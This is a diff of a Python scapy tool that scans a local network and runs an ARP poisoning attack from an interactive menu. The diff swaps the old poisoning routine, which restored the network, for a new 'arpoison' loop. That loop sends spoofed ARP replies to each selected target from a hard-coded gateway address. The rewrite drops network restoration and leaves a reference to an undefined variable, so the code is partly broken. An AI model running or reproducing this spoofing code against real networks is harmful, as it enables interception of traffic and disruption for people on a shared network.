@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 import threading,os,sys,subprocess,time,uuid,re
-from scapy.all import *
+from scapy.all import Ether, ARP, srp, send
 ip_list = []
-activation = False
+activation, debug, deader = False, False, False
 BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, CYAN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\33[36m', '\033[0m'
 def shelp():
 	os.system('clear')
@@ -154,20 +154,6 @@ def resolve_mac(ip):
 	if ip_check != ip:
 		return (':'.join(re.findall('..', '%012x' % uuid.getnode())))
 
-def restore_network(gtwip, gtwmac, trgip, trgmac):
-    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gtwip, hwsrc=trgmac, psrc=trgip), count=5)
-    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=trgip, hwsrc=gtwmac, psrc=gtwip), count=5)
-def arp_poison(gtwip, gtwmac, trgip, trgmac, arp_aut = True):
-    try:
-        while arp_aut == True:
-            send(ARP(op=2, pdst=trgip, hwdst=trgmac, psrc=gtwip),verbose=1)
-            time.sleep(2)
-        displayer('sucess', 'stoping the arp poisoning')
-        restore_network(gtwip, gtwmac, trgip, trgmac)
-    except KeyboardInterrupt:
-        sys.stdout.write(GREEN + '[' + RED + '+' + GREEN + '] '+'Stopped ARP poison attack. Restoring network' + '\n')
-        restore_network(gtwip, gtwmac, trgip, trgmac)
-
 def infoga():
 	hosts_info = []
 	hosts_temp = []
@@ -201,6 +187,12 @@ def interface():
 def save(list):
 	os.system('clear')
 	displayer('info','Saving current hosts')
+
+def arpoison(trg_ip,trg_mac,gw_ip):
+	global deader
+	while deader==False:
+		send((ARP(op = 2, pdst = trg_ip, psrc = '192.168.0.254', hwdst= trg_mac)),verbose = False)
+		time.sleep(5)
 
 def main(debug = False):
 	hosts = infoga()
@@ -264,14 +256,14 @@ def main(debug = False):
 		try:
 			status
 		except:
-			status = BLUE + ' DEAUTH_ATTACK = ' + RED + 'OFF' + YELLOW
+			status = BLUE + ' ARP ATTACk = ' + RED + 'OFF' + YELLOW
 		sys.stdout.write(YELLOW + '| ' +GREEN + 'GREEN' + BLUE + ' = ' + YELLOW + 'regular host' + YELLOW + '                                                         |' + '\n')
 		sys.stdout.write(YELLOW + '| ' +RED + 'RED' + BLUE + ' = ' + YELLOW + 'your machine' + YELLOW + '                                                           |' + '\n')
 		sys.stdout.write(YELLOW + '| ' +MAGENTA + 'MAGENTA' + BLUE + ' = ' + YELLOW + 'gateway' + YELLOW + '                                                            |' + '\n')
 		sys.stdout.write(YELLOW + '| ' +CYAN + 'CYAN' + BLUE + ' = ' + YELLOW + 'selected devices' + YELLOW + '                                                      |' + '\n')
 		sys.stdout.write(RED + '+' + YELLOW + '------------------------------------------------------------------------------' + RED + '+' + '\n')
 		sys.stdout.write(YELLOW + '|'+ BLUE + ' monitor interface = '+ YELLOW +iface +space*(57-len(iface))+'|' + '\n')
-		sys.stdout.write(YELLOW + '|'+ status +'                                                          |' + '\n')
+		sys.stdout.write(YELLOW + '|'+ status +'                                                             |' + '\n')
 		sys.stdout.write(YELLOW + '|'+ msg +'|' + '\n')
 		sys.stdout.write(RED + '+' + YELLOW + '------------------------------------------------------------------------------' + RED + '+' + '\n')
 		sys.stdout.write(MAGENTA + "> " )
@@ -290,21 +282,18 @@ def main(debug = False):
 			if len(selected) == 0:
 				msg=' no target                                                                    '
 				menu(hosts, selected, msg, activation, gw, iface)
-			for i in range(len(selected)):
-				for j in range(len(hosts)):
-					if hosts[j][0] == gw:
-						mac_gw = hosts[j][1]
-						ip_gw = hosts[j][0]
-				arp_aut = True
-				thread_arp = 'thread-'+str(i)
-				thread_arp = threading.Thread(target = arp_poison, args=(ip_gw, mac_gw, selected[i][2], selected[i][1], arp_aut))
+				aut = True
 				displayer('info', 'starting '+str(thread_arp))
-				thread_arp.start()
 			activation = True
+			global deader
+			deader = False
+			for i in range(len(selected)):
+				threading.Thread(target = arpoison,args=(selected[i][0],selected[i][1],gw)).start()
 			menu(hosts, selected, msg, activation, gw, iface)
 		if choice == 'stop arp':
 			aut = False
 			activation = False
+			deader = True
 			menu(hosts, selected, msg, activation, gw, iface)
 		if choice[0].isdigit() == True:
 			if len(choice)==1:
